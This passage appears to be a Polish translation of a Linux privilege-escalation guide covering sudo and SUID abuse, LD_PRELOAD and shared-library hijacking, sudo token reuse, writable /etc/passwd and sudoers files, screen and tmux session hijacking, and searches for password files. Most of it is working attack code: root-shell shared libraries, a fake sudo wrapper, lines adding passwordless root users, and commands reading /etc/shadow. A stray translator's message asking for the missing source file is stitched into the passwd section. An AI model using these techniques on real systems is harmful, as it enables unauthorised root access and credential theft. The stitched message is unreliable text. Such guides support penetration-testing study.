Niektóre wersje Linuxa były podatne na błąd, który pozwala użytkownikom z **UID > INT_MAX** na eskalację uprawnień. Więcej informacji: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Grupy

Sprawdź, czy jesteś **członkiem jakiejś grupy**, która mogłaby przyznać ci uprawnienia roota:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Schowek

Sprawdź, czy w schowku znajduje się coś interesującego (jeśli to możliwe)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Polityka haseł
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

Jeśli **znasz jakiekolwiek hasło** w środowisku **spróbuj zalogować się jako każdy użytkownik** używając tego hasła.

### Su Brute

Jeśli nie przeszkadza Ci generowanie dużego hałasu i na komputerze dostępne są binaria `su` i `timeout`, możesz spróbować przeprowadzić brute-force na koncie użytkownika przy użyciu [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) z parametrem `-a` również próbuje przeprowadzić brute-force na użytkownikach.

## Nadużycia zapisywalnego PATH

### $PATH

Jeśli odkryjesz, że możesz **zapisać do jakiegoś katalogu z $PATH** możesz być w stanie eskalować uprawnienia przez **utworzenie backdoora w zapisywalnym katalogu** o nazwie polecenia, które zostanie uruchomione przez innego użytkownika (najlepiej root) i które **nie jest ładowane z katalogu znajdującego się wcześniej** w $PATH.

### SUDO and SUID

Możesz mieć pozwolenie na uruchomienie pewnego polecenia przy użyciu sudo lub plik może mieć ustawiony suid bit. Sprawdź to używając:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Niektóre **nieoczekiwane polecenia pozwalają odczytać i/lub zapisać pliki, a nawet wykonać polecenie.** Na przykład:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Konfiguracja Sudo może pozwolić użytkownikowi uruchomić pewne polecenie z uprawnieniami innego użytkownika bez znajomości hasła.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
W tym przykładzie użytkownik `demo` może uruchamiać `vim` jako `root`; teraz uzyskanie powłoki jest trywialne przez dodanie ssh key do katalogu `root` lub przez wywołanie `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ta dyrektywa pozwala użytkownikowi **ustawić zmienną środowiskową** podczas wykonywania czegoś:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ten przykład, **oparty na HTB machine Admirer**, był **podatny** na **PYTHONPATH hijacking**, umożliwiając załadowanie dowolnej biblioteki python podczas uruchamiania skryptu jako root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Ścieżki omijające wykonywanie sudo

**Przejdź** aby przeczytać inne pliki lub użyć **symlinks**. Na przykład w pliku sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Jeśli użyty zostanie **wildcard** (\*), jest to jeszcze łatwiejsze:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Środki zaradcze**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bez podanej ścieżki

Jeśli **sudo permission** jest przyznane pojedynczemu poleceniu **bez określenia ścieżki**: _hacker10 ALL= (root) less_ możesz to wykorzystać, zmieniając zmienną PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ta technika może być także użyta, jeśli binarka **suid** **uruchamia inne polecenie bez podania ścieżki do niego (zawsze sprawdź za pomocą** _**strings**_ **zawartość dziwnej binarki SUID)**.

[Payload examples to execute.](payloads-to-execute.md)

### Binarka SUID z podaną ścieżką do polecenia

Jeśli binarka **suid** **uruchamia inne polecenie, podając ścieżkę**, to możesz spróbować **wyeksportować funkcję** nazwaną tak jak polecenie, które wywołuje plik suid.

Na przykład, jeśli binarka suid wywołuje _**/usr/sbin/service apache2 start**_ musisz spróbować stworzyć funkcję i ją wyeksportować:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Następnie, gdy wywołasz plik binarny z suid, ta funkcja zostanie wykonana

### LD_PRELOAD & **LD_LIBRARY_PATH**

Zmienna środowiskowa **LD_PRELOAD** służy do wskazania jednej lub kilku bibliotek współdzielonych (.so files) ładowanych przez loader przed wszystkimi innymi, w tym standardową biblioteką C (`libc.so`). Ten proces znany jest jako preloading biblioteki.

Jednakże, aby utrzymać bezpieczeństwo systemu i zapobiec wykorzystaniu tej funkcji — szczególnie w przypadku plików wykonywalnych **suid/sgid** — system wymusza pewne warunki:

- Loader ignoruje **LD_PRELOAD** dla plików wykonywalnych, gdzie real user ID (_ruid_) nie zgadza się z effective user ID (_euid_).
- Dla plików wykonywalnych ze statusem suid/sgid, wstępnie ładowane są tylko biblioteki znajdujące się w standardowych ścieżkach, które również mają suid/sgid.

Privilege escalation może wystąpić, jeśli masz możliwość uruchamiania poleceń z `sudo` i wynik `sudo -l` zawiera wpis **env_keep+=LD_PRELOAD**. Taka konfiguracja pozwala zmiennej środowiskowej **LD_PRELOAD** zachować się i być rozpoznawaną nawet gdy polecenia są uruchamiane z `sudo`, co potencjalnie prowadzi do wykonania dowolnego kodu z podwyższonymi uprawnieniami.
```
Defaults        env_keep += LD_PRELOAD
```
Zapisz jako **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Następnie **skompiluj to** używając:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na koniec, **escalate privileges** uruchamiając
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Podobny privesc można wykorzystać, jeśli atakujący kontroluje zmienną środowiskową **LD_LIBRARY_PATH**, ponieważ wówczas kontroluje ścieżkę, w której będą wyszukiwane biblioteki.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Gdy natrafisz na plik binarny z uprawnieniami **SUID**, który wydaje się nietypowy, dobrą praktyką jest sprawdzenie, czy poprawnie ładuje pliki **.so**. Można to sprawdzić, uruchamiając następujące polecenie:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na przykład, napotkanie błędu takiego jak _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugeruje potencjalną możliwość eksploatacji.

Aby to wykorzystać, należy utworzyć plik C, np. _"/path/to/.config/libcalc.c"_, zawierający następujący kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ten kod, po skompilowaniu i uruchomieniu, ma na celu eskalację uprawnień poprzez manipulację uprawnieniami plików i uruchomienie shella z podwyższonymi uprawnieniami.

Skompiluj powyższy plik C do biblioteki współdzielonej (.so) za pomocą:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
W końcu uruchomienie dotkniętego SUID binary powinno wywołać exploit, pozwalając na potencjalne przejęcie systemu.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Teraz, gdy znaleźliśmy SUID binary, który ładuje bibliotekę z katalogu, do którego możemy zapisywać, stwórzmy bibliotekę w tym katalogu o wymaganej nazwie:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Jeśli otrzymasz błąd taki jak
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to oznacza, że biblioteka, którą wygenerowałeś, musi mieć funkcję nazwaną `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) to kuratorowana lista binarek Uniksa, które mogą być wykorzystane przez atakującego do obejścia lokalnych ograniczeń bezpieczeństwa. [**GTFOArgs**](https://gtfoargs.github.io/) jest tym samym, ale w przypadkach, gdy możesz **tylko wstrzykiwać argumenty** w polecenie.

Projekt zbiera legalne funkcje binarek Uniksa, które mogą być nadużyte do wydostania się z ograniczonych shelli, eskalacji lub utrzymania podwyższonych uprawnień, transferu plików, uruchamiania bind i reverse shells oraz ułatwiania innych zadań post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Jeśli masz dostęp do `sudo -l`, możesz użyć narzędzia [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aby sprawdzić, czy znajdzie sposób na wykorzystanie dowolnej reguły sudo.

### Reusing Sudo Tokens

W przypadkach, gdy masz **sudo access** ale nie znasz hasła, możesz eskalować uprawnienia przez **oczekiwanie na wykonanie polecenia sudo, a następnie przejęcie tokena sesji**.

Wymagania do eskalacji uprawnień:

- Masz już shell jako użytkownik "_sampleuser_"
- "_sampleuser_" **użył `sudo`** do wykonania czegoś **w ciągu ostatnich 15 minut** (domyślnie to czas trwania tokena sudo, który pozwala nam używać `sudo` bez podawania hasła)
- `cat /proc/sys/kernel/yama/ptrace_scope` ma wartość 0
- `gdb` jest dostępny (możesz go przesłać)

(Możesz tymczasowo włączyć `ptrace_scope` za pomocą `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` lub na stałe modyfikując `/etc/sysctl.d/10-ptrace.conf` i ustawiając `kernel.yama.ptrace_scope = 0`)

Jeśli wszystkie te wymagania są spełnione, **możesz eskalować uprawnienia za pomocą:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **pierwszy exploit** (`exploit.sh`) utworzy binarkę `activate_sudo_token` w _/tmp_. Możesz jej użyć do **aktywowania tokenu sudo w swojej sesji** (nie otrzymasz automatycznie powłoki roota, uruchom `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Drugi **exploit** (`exploit_v2.sh`) utworzy powłokę sh w _/tmp_ **będącą własnością root z bitem setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Trzeci exploit** (`exploit_v3.sh`) **utworzy sudoers file**, co sprawi, że **sudo tokens będą wieczne i wszyscy użytkownicy będą mogli używać sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Jeśli masz **uprawnienia do zapisu** w folderze lub na którymkolwiek z utworzonych w nim plików, możesz użyć binarki [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) aby **utworzyć token sudo dla użytkownika i PID**.\
Na przykład, jeśli możesz nadpisać plik _/var/run/sudo/ts/sampleuser_ i masz shell jako ten użytkownik z PID 1234, możesz **uzyskać uprawnienia sudo** bez konieczności znajomości hasła wykonując:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Plik `/etc/sudoers` oraz pliki w katalogu `/etc/sudoers.d` konfigurują, kto może używać `sudo` i w jaki sposób.\
**Te pliki domyślnie mogą być odczytywane tylko przez użytkownika root i grupę root**.\
**Jeśli** możesz **odczytać** ten plik, możesz być w stanie **uzyskać pewne interesujące informacje**, a jeśli możesz **zapisać** dowolny plik, będziesz w stanie **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Jeśli masz możliwość zapisu, możesz nadużyć to uprawnienie.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Inny sposób nadużycia tych uprawnień:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Istnieją pewne alternatywy dla binarki `sudo`, takie jak `doas` dla OpenBSD — pamiętaj, aby sprawdzić jego konfigurację w `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Jeśli wiesz, że **użytkownik zwykle łączy się z maszyną i używa `sudo`** do eskalacji uprawnień i masz shell w kontekście tego użytkownika, możesz **utworzyć nowy sudo executable**, który uruchomi twój kod jako root, a następnie wykona polecenie użytkownika. Następnie **zmodyfikuj $PATH** w kontekście użytkownika (np. dodając nową ścieżkę w .bash_profile), tak aby gdy użytkownik wywoła sudo, uruchamiany był twój sudo executable.

Zwróć uwagę, że jeśli użytkownik używa innego shell (nie bash), będziesz musiał zmodyfikować inne pliki, aby dodać nową ścieżkę. Na przykład [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modyfikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Inny przykład znajdziesz w [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Lub uruchamiając coś takiego:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteka współdzielona

### ld.so

Plik `/etc/ld.so.conf` wskazuje **skąd pochodzą ładowane pliki konfiguracyjne**. Zazwyczaj plik zawiera następującą ścieżkę: `include /etc/ld.so.conf.d/*.conf`

To oznacza, że pliki konfiguracyjne z `/etc/ld.so.conf.d/*.conf` zostaną odczytane. Te pliki konfiguracyjne **wskazują na inne foldery**, gdzie **biblioteki** będą **wyszukiwane**. Na przykład zawartość `/etc/ld.so.conf.d/libc.conf` to `/usr/local/lib`. **To oznacza, że system będzie szukał bibliotek w `/usr/local/lib`**.

Jeśli z jakiegoś powodu **użytkownik ma uprawnienia do zapisu** na którejkolwiek z wskazanych ścieżek: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, w dowolnym pliku wewnątrz `/etc/ld.so.conf.d/` lub w dowolnym folderze wskazanym w pliku konfiguracyjnym w `/etc/ld.so.conf.d/*.conf`, może być w stanie eskalować uprawnienia.\
Sprawdź **jak wykorzystać tę niewłaściwą konfigurację** na następującej stronie:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiując lib do `/var/tmp/flag15/`, program użyje jej w tym miejscu, jak określono w zmiennej `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Następnie utwórz złośliwą bibliotekę w `/var/tmp` za pomocą `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities provide a **podzbiór dostępnych uprawnień roota dla procesu**. To efektywnie rozbija uprawnienia roota na **mniejsze i wyróżnialne jednostki**. Każdej z tych jednostek można następnie niezależnie nadać procesom. W ten sposób zmniejsza się zakres pełnych uprawnień, redukując ryzyko wykorzystania.\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

W katalogu, **bit for "execute"** oznacza, że dotknięty użytkownik może **cd** do folderu.\
Bit **"read"** oznacza, że użytkownik może **list** **pliki**, a bit **"write"** oznacza, że użytkownik może **delete** i **create** nowe **pliki**.

## ACLs

Access Control Lists (ACLs) stanowią drugą warstwę dyskrecjonalnych uprawnień, zdolną do **overriding the traditional ugo/rwx permissions**. Te uprawnienia zwiększają kontrolę nad dostępem do pliku lub katalogu, pozwalając lub odmawiając praw konkretnym użytkownikom, którzy nie są właścicielami ani członkami grupy. Ten poziom **granularity ensures more precise access management**. Dalsze szczegóły można znaleźć [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pobierz** pliki o określonych ACL ze systemu:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otwarte shell sessions

W **starszych wersjach** możesz **hijack** pewną **shell** session innego użytkownika (**root**).\
W **najnowszych wersjach** będziesz mógł **connect** do screen sessions tylko **swojego własnego użytkownika**. Jednak możesz znaleźć **interesujące informacje wewnątrz session**.

### screen sessions hijacking

**Wyświetl screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Dołącz do sesji**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

To był problem ze **starymi wersjami tmux**. Nie udało mi się hijack a tmux (v2.1) session utworzonej przez root jako użytkownik nieuprzywilejowany.

**Wyświetl listę sesji tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Dołącz do sesji**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Wszystkie klucze SSL i SSH wygenerowane na systemach opartych na Debianie (Ubuntu, Kubuntu, itd.) między wrześniem 2006 a 13 maja 2008 mogą być dotknięte przez ten błąd.\
Błąd ten występuje przy tworzeniu nowego ssh key w tych OS, ponieważ **tylko 32,768 variations were possible**. Oznacza to, że wszystkie możliwości można obliczyć i **mając ssh public key możesz wyszukać odpowiadający private key**. Możesz znaleźć obliczone możliwości tutaj: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Określa, czy uwierzytelnianie hasłem jest dozwolone. Domyślnie `no`.
- **PubkeyAuthentication:** Określa, czy uwierzytelnianie za pomocą klucza publicznego jest dozwolone. Domyślnie `yes`.
- **PermitEmptyPasswords**: Gdy uwierzytelnianie hasłem jest dozwolone, określa, czy serwer pozwala na logowanie do kont z pustym hasłem. Domyślnie `no`.

### PermitRootLogin

Określa, czy root może logować się używając ssh, domyślnie `no`. Możliwe wartości:

- `yes`: root może logować się używając hasła i klucza prywatnego
- `without-password` or `prohibit-password`: root może logować się tylko za pomocą klucza prywatnego
- `forced-commands-only`: root może logować się tylko używając klucza prywatnego i jeśli opcje commands są określone
- `no` : nie

### AuthorizedKeysFile

Określa pliki zawierające klucze publiczne, które mogą być użyte do uwierzytelniania użytkownika. Może zawierać tokeny takie jak `%h`, które zostaną zastąpione katalogiem domowym. **Możesz wskazać ścieżki bezwzględne** (rozpoczynające się od `/`) lub **ścieżki względne względem katalogu domowego użytkownika**. Na przykład:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracja wskaże, że jeśli spróbujesz zalogować się za pomocą **private** klucza użytkownika "**testusername**", ssh porówna klucz publiczny twojego klucza z tymi znajdującymi się w `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding pozwala ci **używać swoich lokalnych SSH keys zamiast zostawiać klucze** (bez passphrases!) na serwerze. Dzięki temu będziesz mógł **przeskoczyć** przez ssh **na hosta**, a stamtąd **przeskoczyć na inny** host **używając** **klucza** znajdującego się na twoim **początkowym hoście**.

Musisz ustawić tę opcję w `$HOME/.ssh.config` w następujący sposób:
```
Host example.com
ForwardAgent yes
```
Zauważ, że jeśli `Host` ma wartość `*`, za każdym razem gdy użytkownik przełączy się na inną maszynę, ta maszyna będzie mogła uzyskać dostęp do kluczy (co jest problemem bezpieczeństwa).

Plik `/etc/ssh_config` może **nadpisać** te **opcje** i zezwolić lub zablokować tę konfigurację.\
Plik `/etc/sshd_config` może **zezwalać** lub **zabraniać** ssh-agent forwarding za pomocą słowa kluczowego `AllowAgentForwarding` (domyślnie zezwolone).

Jeśli stwierdzisz, że Forward Agent jest skonfigurowany w danym środowisku, przeczytaj następującą stronę, ponieważ **możesz być w stanie wykorzystać to do eskalacji uprawnień**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Ciekawe pliki

### Pliki profili

Plik `/etc/profile` oraz pliki w katalogu `/etc/profile.d/` to **skrypty uruchamiane, gdy użytkownik uruchamia nową powłokę**. W związku z tym, jeśli możesz **zapisać lub zmodyfikować którykolwiek z nich, możesz eskalować uprawnienia**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Jeśli znajdziesz jakiś podejrzany skrypt profilu, sprawdź go pod kątem **wrażliwych informacji**.

### Pliki passwd/shadow

W zależności od systemu operacyjnego pliki `/etc/passwd` i `/etc/shadow` mogą mieć inną nazwę lub może istnieć ich kopia zapasowa. Dlatego zaleca się **odnaleźć wszystkie** i **sprawdzić, czy możesz je odczytać**, aby zobaczyć, **czy w plikach znajdują się hashes**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
W niektórych przypadkach możesz znaleźć **password hashes** w pliku `/etc/passwd` (lub równoważnym).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Możliwość zapisu do /etc/passwd

Najpierw wygeneruj hasło za pomocą jednego z następujących poleceń.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Nie otrzymałem zawartości pliku src/linux-hardening/privilege-escalation/README.md. Proszę wklej jego zawartość, a przetłumaczę tekst na polski. Jeśli chcesz, mogę też dodać do przetłumaczonego pliku fragment z poleceniami tworzącymi użytkownika `hacker` i wstawić wygenerowane hasło — potwierdź, czy to zrobić.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Np.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Możesz teraz użyć polecenia `su` z `hacker:hacker`

Alternatywnie możesz użyć poniższych linii, aby dodać użytkownika bez hasła.\
UWAGA: możesz obniżyć bieżący poziom bezpieczeństwa maszyny.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
UWAGA: Na platformach BSD `/etc/passwd` znajduje się w `/etc/pwd.db` i `/etc/master.passwd`, a `/etc/shadow` został przemianowany na `/etc/spwd.db`.

Powinieneś sprawdzić, czy możesz **zapisywać w niektórych wrażliwych plikach**. Na przykład, czy możesz zapisać do jakiegoś **pliku konfiguracyjnego usługi**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na przykład, jeśli na maszynie działa serwer **tomcat** i możesz **modify the Tomcat service configuration file inside /etc/systemd/,** możesz zmodyfikować następujące linie:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Twój backdoor zostanie uruchomiony następnym razem, gdy tomcat zostanie uruchomiony.

### Sprawdź foldery

Następujące foldery mogą zawierać kopie zapasowe lub interesujące informacje: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Prawdopodobnie nie będziesz w stanie odczytać ostatniego, ale spróbuj)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Dziwne lokalizacje/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Zmodyfikowane pliki w ostatnich minutach
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Pliki Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml pliki
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Ukryte pliki
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries w PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Pliki webowe**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Kopie zapasowe**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Znane pliki zawierające hasła

Przejrzyj kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), on wyszukuje **wiele plików, które mogą zawierać hasła**.\
